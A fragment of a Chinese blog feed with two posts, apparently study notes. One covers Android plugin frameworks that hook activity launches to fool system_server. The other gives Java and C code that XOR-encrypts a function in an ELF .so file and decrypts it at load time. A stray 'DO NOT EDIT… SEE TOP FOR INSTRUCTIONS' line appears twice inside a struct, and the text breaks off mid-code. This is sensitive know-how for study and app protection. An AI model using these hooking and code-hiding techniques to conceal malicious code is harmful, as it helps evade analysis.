alt="这里写图片描述"></p><p>现有的能够实现上述需求的框架主要有DroidPlugin、VirtualApp、DynamicAPK<br>典型的应用有Parallel Space，截止2017年下载了达到千万级别<br>虽然很多类型的这种框架，但是他们得底层实现机制基本相同</p><h3 id="Demystify-Plugin-Technology"><a href="#Demystify-Plugin-Technology" class="headerlink" title="Demystify Plugin Technology"></a><strong>Demystify Plugin Technology</strong></h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTAzMzM5NTE0?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>插件技术最主要的中原理就是，为了让插件中的方法能够正确的调用。Host APP把所有的插件和系统（Android Framework交互）的方法都在内部Hook并替换掉了。</p><p><strong>为什么这样做呢？</strong> </p><p>因为，这个是一个插件系统，Activity是虚拟Proxy出来的。四大组件，并不是真正的，即Context拿到不一定是真的。系统也不会有此类的回调。所以，很多单例都需要执行Context才能使用。比如：InputMethodManager.getInstance(Context context)；这时，插件中的代码将不能够直接运行。当然，还有其他原因。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTAzNDA5NDM3?x-oss-process=image/format,png" alt="这里写图片描述"></p><h3 id="动态加载运行一个Activity的基本机制"><a href="#动态加载运行一个Activity的基本机制" class="headerlink" title="动态加载运行一个Activity的基本机制"></a><strong>动态加载运行一个Activity的基本机制</strong></h3><p>为了进一步的理解这种插件运行机制中的HOOK技术，我们来看一个简单的实例，即如何动态加载运行一个Apk中的Activity,</p><p>既然说到动态加载，我们很容易想到Davilk虚拟机中的类加载器</p><p>(1) DexClassLoader可以加载任何路径的apk/dex/jar/zip<br>(2) PathClassLoader只能加载缓存在/data/app中的apk，也就是已经安装到手机中的apk</p><p>那么如何加载一个apk并运行其中的Activity呢？我们很容易想到使用如下代码实现</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTAzNTAzMTc2?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>这样显然是不行的<br>因为Android中的四大组件都有一个特点就是他们有自己的启动流程和生命周期，我们使用DexClassLoader加载进来的Activity是不会涉及到任何启动流程和生命周期的概念，说白了，就是一个普普通通的类，所以启动肯定会出错。<br>那么如何解决呢？</p><h4 id="思路一：替换LoadedApk中mClassLoader"><a href="#思路一：替换LoadedApk中mClassLoader" class="headerlink" title="思路一：替换LoadedApk中mClassLoader"></a><strong>思路一：替换LoadedApk中mClassLoader</strong></h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTAzNjIxMDQ4?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>由于这个mClassLoader是非static类型的引用，因此我们通过反射的机制无法更改当前运行时数据，那么该怎么办呢？我们再看ActivityThread这个类</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTAzNjQzODYz?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>这个类中有一个静态变量，我们可以通过反射这个类，来获取LoadedApk对象，然后更改其mClassLoader</p><h4 id="思路二：更新DexPathList数据结构"><a href="#思路二：更新DexPathList数据结构" class="headerlink" title="思路二：更新DexPathList数据结构"></a><strong>思路二：更新DexPathList数据结构</strong></h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTAzNzMwMjM3?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>APK在启动的过程中加载的dex文件都存放在一个叫dexElements的数据结构中，我们通过将插件APK的dex文件解析后的数据结构也放入此数据中，使其成为host App的一部分，那么host app在启动其中的Activity的时候就具有上下文环境了，相应的组件也会有生命周期</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTAzNzUxODI1?x-oss-process=image/format,png" alt="这里写图片描述"></p><h4 id="思路三：使用静态代理"><a href="#思路三：使用静态代理" class="headerlink" title="思路三：使用静态代理"></a><strong>思路三：使用静态代理</strong></h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTAzODI0NTIz?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>基本思路是使用一个在host app中具有生命周期和执行上下文的Activity代理插件Activity执行其各个生命周期的回调函数</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTAzODQ5NzQw?x-oss-process=image/format,png" alt="这里写图片描述"></p><h4 id="之前三种方式共有的缺陷"><a href="#之前三种方式共有的缺陷" class="headerlink" title="之前三种方式共有的缺陷"></a><strong>之前三种方式共有的缺陷</strong></h4><p>(1) 需要在宿主应用的Manifest文件中注册要启动的Plugin中的组件，权限等信息，只能加载运行特定已知的apk，因此不可能将所有需要以插件方式进行运行的APK中的组件全部进行注册</p><h4 id="思路四：使用hook技术代理实现"><a href="#思路四：使用hook技术代理实现" class="headerlink" title="思路四：使用hook技术代理实现"></a><strong>思路四：使用hook技术代理实现</strong></h4><p>我们先看下启动一个Activity的基本过程，图中已说明详细，这里不再赘述了</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTAzOTQ0NzY4?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>由于前三种方式的缺陷，第四重方式通过预先在Host APP的Manifest文件中预注册一些启动插件app会用到的一些Dummy 组件，也就是图中的StubActivity，当使用intent启动一个PluginActivity的时候，使用Hook拦截此消息，将PluginActivity更换为StubActivity，通过Binder系统调用进行进程间过程调用，ActivityManngerService执行Activity的栈管理、验证等过程，由于我们使用将PluginActivity更换为StubActivity，而StubActivity又在Host APP的Manifest文件中预注册了。所以验证会通过，然后ActivityManngerService将控制权移交给APP进程（同样通过进程间的RPC调用），然后APP进程开始执行真正创建Activity的过程，这创建之前又通过hook将StubActivity更换为PluginActivity，启动真正要启动的Activity，因此这样就可以瞒天过海，欺上瞒下，骗过System_server进程，同时使得启动的Activity又具有相应的生命周期，整个过程还是比较直观的。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTA0MDE4Mjg0?x-oss-process=image/format,png" alt="这里写图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Plugin-Technology-Background&quot;&gt;&lt;a href=&quot;#Plugin-Technology-Background&quot; class=&quot;headerlink&quot; title=&quot;Plugin Technology Background&quot;&gt;&lt;/a&gt;&lt;s
      
    
    </summary>
    
    
      <category term="移动安全" scheme="https://blog.kaide0521.cn/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="App虚拟化" scheme="https://blog.kaide0521.cn/tags/App%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
      <category term="应用多开" scheme="https://blog.kaide0521.cn/tags/%E5%BA%94%E7%94%A8%E5%A4%9A%E5%BC%80/"/>
    
  </entry>
  
  <entry>
    <title>基于函数加密的.so加固学习笔记</title>
    <link href="https://blog.kaide0521.cn/2020/01/07/%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E5%8A%A0%E5%AF%86%E7%9A%84-so%E5%8A%A0%E5%9B%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.kaide0521.cn/2020/01/07/%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E5%8A%A0%E5%AF%86%E7%9A%84-so%E5%8A%A0%E5%9B%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-01-07T13:41:53.000Z</published>
    <updated>2020-01-07T13:42:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>标签（空格分隔）： Apk逆向与保护</p><hr><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a><strong>1. 前言</strong></h3><p>之前学习了简单对ELF文件中的Section进行加密实现简单暴力的加固，这个section是自定义的，一般很容易被识别出来，更好的做法是对函数进行加密。既然是对函数加密，我们就需要找到函数的地址和大小。既然是找到函数的地址，必然是基于ELF文件的转载视图来进行操作的。</p><h3 id="2-基本思路"><a href="#2-基本思路" class="headerlink" title="2. 基本思路"></a><strong>2. 基本思路</strong></h3><h3 id="2-1-如何找到要加密的函数"><a href="#2-1-如何找到要加密的函数" class="headerlink" title="2.1 如何找到要加密的函数"></a><strong>2.1 如何找到要加密的函数</strong></h3><p>基于section的加密，我们很容易根据elf文件的header找到.shstrtab节区，从而找到我们要对其进行加密的section，此处我们该如何找到函数的定义呢？这就要求对ELF文件的结构要有进一步较深的认识，通过ELF文件的格式我们知道，ELF文件中存在.dynsym和.dynstr这两个节区，.dynsym主要是描述动态链接的符号或者函数结构信息，.dynstr主要描述动态链接的符号字符串或函数名称。</p><p>那么我们可以通过type来获取.dynsym和.dynstr吗？</p><p>答案是否定的，因为不同的section的type可能相同，比如.dynstr和.shstrtab的type都是STRTAB<br>在ELF中，每个函数的结构描述放在.dynsym中，函数的名称放在.dynstr中，我们怎么去查找它们的对应关系呢？<br>有一个叫.hash的section，这个节描述的是一个hash表，其结构图如下：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzA1MjA0ODM4MDY2?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>bucket 数组包含 nbucket 个项目,chain 数组包含 nchain 个项目,下标都是从 0 开始。bucket 和 chain 中都保存符号表索引。chain 表项和符号表存在对应。符号表项的数目应该和 nchain 相等,所以符号表的索引也可用来选取 chain 表项。</p><p>假如符号s = “aaaa”,hash(s) = 5,则index = bucket[5 % 10] = 5;<br>则给出其存放的初始索引为5，如果发现索引为index出的符号不是s,那么chain[index]则给出与s具有相同哈希值的符号的索引（可以理解为不同字符串通过哈希映射取模会产生冲突），因此一直这么搜索下去，知道找到符号s所在的索引为止。</p><h3 id="2-1-如何找到-hash节区"><a href="#2-1-如何找到-hash节区" class="headerlink" title="2.1 如何找到.hash节区"></a><strong>2.1 如何找到.hash节区</strong></h3><p>通过对ELF文件的研究，我们发现，当so被加载后，其section结构对于加载视图来说是无意义的，so的加载视图中有个段叫做.dynmic，此段包含了动态链接信息，因此.dynsym和.dynstr，.hash节区肯定包含在这里（一个段可以包含多个节区）,因此我们只要找到装载视图中的.dynamic段，然后解析成dynmic结构信息，然后根据type类型找到.dynsym和.dynstr，.hash节区<br><strong>具体过程：</strong><br>(1) 找到.dynamic段；.dynamic段的描述可根据程序头部表来找到，该段在程序头部表中用符号DYNAMIC来标记</p><p>(2) 找到.dynamic段之后解析成相关的数据结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct dynamic &#123;</span><br><span class="line">  Elf32_Sword d_tag;    &#x2F;* Dynamic entry type *&#x2F;</span><br><span class="line">  &#x2F;* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS *&#x2F;</span><br><span class="line">  union &#123;</span><br><span class="line">    Elf32_Sword d_val;</span><br><span class="line">    Elf32_Addr d_ptr;</span><br><span class="line">  &#125; d_un;</span><br><span class="line">  &#x2F;* WARNING: DO NOT EDIT, AUTO-GENERATED CODE - SEE TOP FOR INSTRUCTIONS *&#x2F;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p>对于每个这种类型的结构，d_tag控制了d_un的解释含义：</p><ul><li>d_val 此 Elf32_Word 对象表示一个整数值，可以有多种解释。</li><li>d_ptr 此 Elf32_Addr 对象代表程序的虚拟地址。如前所述，文件的虚拟地址可能与执行过程中的内存虚地址不匹配。在解释包含于动态结构中的地址时，动态链接程序基于原来文件值和内存基地址计算实际地址。为了保持一致性，文件中不包含用来“纠正”动态结构中重定位项地址的重定位项目。</li></ul><p>(3) 根据d_tag标志，找到.dynsym和.dynstr，.hash节区</p><p>为什么这里又可以根据type类型来找到相应的节区呢？因为此时我们在.dynamic段里面进行匹配，type相对来说是唯一的</p><h3 id="2-加密具体过程"><a href="#2-加密具体过程" class="headerlink" title="2. 加密具体过程"></a><strong>2. 加密具体过程</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">     * 实现对so的函数进行加密操作</span><br><span class="line">     *</span><br><span class="line">     * @param elfFilePath  输入的ELF文件路径</span><br><span class="line">     * @param outPath      加密操作完成后输出路径</span><br><span class="line">     * @param functionName 要进行加密的函数名称</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public static void doFunctionEncryption(String elfFilePath, String outPath, String functionName) &#123;</span><br><span class="line">        byte[] fileContent &#x3D; Utils.readFile(elfFilePath);</span><br><span class="line">        if (fileContent &#x3D;&#x3D; null) &#123;</span><br><span class="line">            System.out.println(&quot;read file byte failed...&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;** 首先将ELF文件解析成 ElfType32的对象格式，ElfType32封装了ELF文件各个部分的属性信息 *&#x2F;</span><br><span class="line">        ElfType32 type_32 &#x3D; ELFParser.parseElfToType32(fileContent);</span><br><span class="line">        &#x2F;** 对我们指定的section进行加密操作 *&#x2F;</span><br><span class="line">        doEncryptionFunction(fileContent, type_32, functionName);</span><br><span class="line"></span><br><span class="line">        ElfType32 otype_32 &#x3D; ELFParser.parseElfToType32(fileContent);</span><br><span class="line"></span><br><span class="line">        Utils.saveFile(outPath, fileContent);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>实现加密操作：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">private static void doEncryptionFunction(byte[] fileByteArys, ElfType32 type_32, String functionName) &#123;</span><br><span class="line">        &#x2F;** 得到Dynamic段的偏移值和大小**&#x2F;</span><br><span class="line">        int dy_offset &#x3D; 0, dy_size &#x3D; 0;</span><br><span class="line">        for (elf32_phdr phdr : type_32.phdrList) &#123;</span><br><span class="line">            if (Utils.byte2Int(phdr.p_type) &#x3D;&#x3D; ElfType32.PT_DYNAMIC) &#123;</span><br><span class="line">                dy_offset &#x3D; Utils.byte2Int(phdr.p_offset);</span><br><span class="line">                dy_size &#x3D; Utils.byte2Int(phdr.p_filesz);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;dy_size:&quot; + dy_size);</span><br><span class="line">        &#x2F;** 解析得到Dynamic段中的每个节区**&#x2F;</span><br><span class="line">        ELFParser.getDynamicTableList(fileByteArys, dy_size, dy_offset, type_32);</span><br><span class="line">        &#x2F;** .dynstr的大小和偏移**&#x2F;</span><br><span class="line">        int dynstr_size &#x3D; 0, dynstr_offset &#x3D; 0;</span><br><span class="line">        &#x2F;** .dynsym的偏移**&#x2F;</span><br><span class="line">        int dynsym_offset &#x3D; 0;</span><br><span class="line">        &#x2F;** .hash的偏移**&#x2F;</span><br><span class="line">        int hash_offset &#x3D; 0;</span><br><span class="line">        &#x2F;** 根据type解析每个字段的值 **&#x2F;</span><br><span class="line">        for (Elf32_dyn dyn : type_32.dynList) &#123;</span><br><span class="line">            if (Utils.byte2Int(dyn.d_tag) &#x3D;&#x3D; ElfType32.DT_HASH) &#123;</span><br><span class="line">                hash_offset &#x3D; Utils.byte2Int(dyn.d_ptr);</span><br><span class="line">            &#125; else if (Utils.byte2Int(dyn.d_tag) &#x3D;&#x3D; ElfType32.DT_STRTAB) &#123;</span><br><span class="line">                System.out.println(&quot;strtab:&quot; + dyn);</span><br><span class="line">                dynstr_offset &#x3D; Utils.byte2Int(dyn.d_ptr);</span><br><span class="line">            &#125; else if (Utils.byte2Int(dyn.d_tag) &#x3D;&#x3D; ElfType32.DT_SYMTAB) &#123;</span><br><span class="line">                System.out.println(&quot;systab:&quot; + dyn);</span><br><span class="line">                dynsym_offset &#x3D; Utils.byte2Int(dyn.d_ptr);</span><br><span class="line">            &#125; else if (Utils.byte2Int(dyn.d_tag) &#x3D;&#x3D; ElfType32.DT_STRSZ) &#123;</span><br><span class="line">                System.out.println(&quot;strsz:&quot; + dyn);</span><br><span class="line">                dynstr_size &#x3D; Utils.byte2Int(dyn.d_val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;** 获取.dynstr节的字节数组，也就是符号字符数据集合 **&#x2F;</span><br><span class="line">        byte[] dynstr &#x3D; Utils.copyBytes(fileByteArys, dynstr_offset, dynstr_size);</span><br><span class="line">        int funcIndex &#x3D; 0;</span><br><span class="line">        for (Elf32_dyn dyn : type_32.dynList) &#123;</span><br><span class="line">            if (Utils.byte2Int(dyn.d_tag) &#x3D;&#x3D; ElfType32.DT_HASH) &#123;</span><br><span class="line">                int nbucket &#x3D; Utils.byte2Int(Utils.copyBytes(fileByteArys, hash_offset, 4));</span><br><span class="line">                int nchian &#x3D; Utils.byte2Int(Utils.copyBytes(fileByteArys, hash_offset + 4, 4));</span><br><span class="line">                int hash &#x3D; (int) Utils.getElfHash(functionName.getBytes());</span><br><span class="line">                hash &#x3D; (hash % nbucket);</span><br><span class="line">                &#x2F;** 得到函数的索引值，这里的8是读取nbucket和nchian的两个值**&#x2F;</span><br><span class="line">                funcIndex &#x3D; Utils.byte2Int(Utils.copyBytes(fileByteArys, hash_offset + hash * 4 + 8, 4));</span><br><span class="line">                System.out.println(&quot;nbucket:&quot; + nbucket + &quot;,hash:&quot; + hash + &quot;,funcIndex:&quot; + funcIndex + &quot;,chian:&quot; + nchian);</span><br><span class="line">                System.out.println(&quot;sym:&quot; + Utils.bytes2HexString(Utils.int2Byte(dynsym_offset)));</span><br><span class="line">                System.out.println(&quot;hash:&quot; + Utils.bytes2HexString(Utils.int2Byte(hash_offset)));</span><br><span class="line">                int dynsym_size &#x3D; 16;</span><br><span class="line">                byte[] des &#x3D; new byte[dynsym_size];</span><br><span class="line">                &#x2F;** 根据函数的索引值在.dynsym节中找到其具体的描述结构信息**&#x2F;</span><br><span class="line">                System.arraycopy(fileByteArys, dynsym_offset + funcIndex * dynsym_size, des, 0, dynsym_size);</span><br><span class="line">                Elf32_Sym sym &#x3D; ELFParser.parseSymbolTable(des);</span><br><span class="line">                System.out.println(&quot;sym:&quot; + sym);</span><br><span class="line">                boolean isFindFunc &#x3D; Utils.isEqualByteAry(dynstr, Utils.byte2Int(sym.st_name), functionName);</span><br><span class="line">                while(true)&#123;</span><br><span class="line">                    if(isFindFunc)&#123;</span><br><span class="line">                        System.out.println(&quot;find func...&quot;);</span><br><span class="line">                        &#x2F;** 得到函数体的字节大小 **&#x2F;</span><br><span class="line">                        int functionSize &#x3D; Utils.byte2Int(sym.st_size);</span><br><span class="line">                        &#x2F;** 得到函数体的偏移量 **&#x2F;</span><br><span class="line">                        int functionOffset &#x3D; Utils.byte2Int(sym.st_value);</span><br><span class="line">                        System.out.println(&quot;size:&quot; + functionSize + &quot;,funcOffset:&quot; + functionOffset);</span><br><span class="line">                        &#x2F;** 进行目标函数代码部分进行加密 **&#x2F;</span><br><span class="line">                        byte[] funcAry &#x3D; Utils.copyBytes(fileByteArys, functionOffset - 1, functionSize);</span><br><span class="line">                        for (int i &#x3D; 0; i &lt; funcAry.length - 1; i++) &#123;</span><br><span class="line">                            funcAry[i] &#x3D; (byte) (funcAry[i] ^ 0xFF);</span><br><span class="line">                        &#125;</span><br><span class="line">                        &#x2F;** 将加密后的函数体替换回去 **&#x2F;</span><br><span class="line">                        Utils.replaceByteAry(fileByteArys, functionOffset - 1, funcAry);</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#x2F;** 如果没有找到，则通过chain[index]找到具有相同hash值的下个符号索引 **&#x2F;</span><br><span class="line">                    funcIndex &#x3D; Utils.byte2Int(Utils.copyBytes(fileByteArys, hash_offset + 4 * ( 2 + nbucket + funcIndex), 4));</span><br><span class="line">                    System.out.println(&quot;funcIndex:&quot;+funcIndex);</span><br><span class="line">                    System.arraycopy(fileByteArys, dynsym_offset + funcIndex*dynsym_size, des, 0, dynsym_size);</span><br><span class="line">                    sym &#x3D; ELFParser.parseSymbolTable(des);</span><br><span class="line">                    isFindFunc &#x3D; Utils.isEqualByteAry(dynstr, Utils.byte2Int(sym.st_name), functionName);</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="3-解密具体过程"><a href="#3-解密具体过程" class="headerlink" title="3. 解密具体过程"></a><strong>3. 解密具体过程</strong></h3><p><strong>定义解密函数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;** 定义解密函数为__attribute__((constructor))，在Main函数之前执行 **&#x2F;</span><br><span class="line">void init_decryption() __attribute__((constructor));</span><br></pre></td></tr></table></figure><p><strong>执行解密操作</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;** 执行解密操作 **&#x2F;</span><br><span class="line">void init_decryption() &#123;</span><br><span class="line">    const char *functionName &#x3D; &quot;Java_idc_hust_edu_cn_functionso_JNIDemo_stringFromJNI&quot;;</span><br><span class="line">    unsigned int base_addr &#x3D; getLibVPAddr();</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;base addr &#x3D;  0x%x&quot;, base_addr);</span><br><span class="line">    &#x2F;** 用来保存函数的结构信息 **&#x2F;</span><br><span class="line">    funcInfo info;</span><br><span class="line">    if (getTargetFuncInfo(base_addr, functionName, &amp;info) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        print_debug(&quot;Find Java_com_example_shelldemo2_MainActivity_getString failed&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;** 函数体占的物理页块数目 **&#x2F;</span><br><span class="line">    unsigned int npage &#x3D; info.st_size &#x2F; PAGE_SIZE + ((info.st_size % PAGE_SIZE &#x3D;&#x3D; 0) ? 0 : 1);</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;npage &#x3D;  0x%d&quot;, npage);</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;npage &#x3D;  0x%d&quot;, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    &#x2F;** 修改内存的操作权限，因为不同的虚拟地址空间的内存段是有权限限制的，比如代码段是只读，数据段：可读可写**&#x2F;</span><br><span class="line">    if (mprotect((void *) ((base_addr + info.st_value) &#x2F; PAGE_SIZE * PAGE_SIZE), 4096 * npage,</span><br><span class="line">                 PROT_READ | PROT_EXEC | PROT_WRITE) !&#x3D; 0) &#123;</span><br><span class="line">        print_debug(&quot;mem privilege change failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;** 执行具体的解密操作 **&#x2F;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; info.st_size - 1; i++) &#123;</span><br><span class="line">        char *addr &#x3D; (char *) (base_addr + info.st_value - 1 + i);</span><br><span class="line">        *addr &#x3D; ~(*addr);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;** 解密完成后，要修改回权限 **&#x2F;</span><br><span class="line">    if (mprotect((void *) ((base_addr + info.st_value) &#x2F; PAGE_SIZE * PAGE_SIZE), 4096 * npage,</span><br><span class="line">                 PROT_READ | PROT_EXEC) !&#x3D; 0) &#123;</span><br><span class="line">        print_debug(&quot;mem privilege change failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 获得指定函数的符号表结构，整个过程和加密过程定位符号表基本类似</span><br><span class="line"> *</span><br><span class="line"> * @param base_addr  虚拟基址</span><br><span class="line"> * @param 